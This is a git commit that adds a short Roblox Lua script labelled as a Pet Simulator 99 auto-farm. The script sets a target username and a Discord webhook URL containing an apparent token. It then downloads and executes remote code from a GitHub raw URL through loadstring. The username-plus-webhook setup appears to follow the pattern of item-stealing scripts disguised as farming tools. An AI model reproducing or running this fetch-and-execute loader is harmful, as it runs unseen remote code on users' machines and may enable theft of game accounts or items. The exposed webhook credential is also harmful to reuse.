76008f5604017fbbf86a950ca0f8c2f0f1caf3a6
MrGamesPro <83628404+MrGamesPro@users.noreply.github.com>
2024-12-25 17:52:09 +0700

    PetSim99AutoFarm

---
+++ PetSimulatorAutoFarm.lua
@@ -0,0 +1,3 @@
+_G.username = "NT_Hyuso"
+_G.Webhook = "https://discord.com/api/webhooks/1320783401464369324/mj7M6S0EU7Z3y_AJi4_q3TwNIbFCscwI88fhuPZmtBZKifKOXhLPRus2coDU-Hyqncn0"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
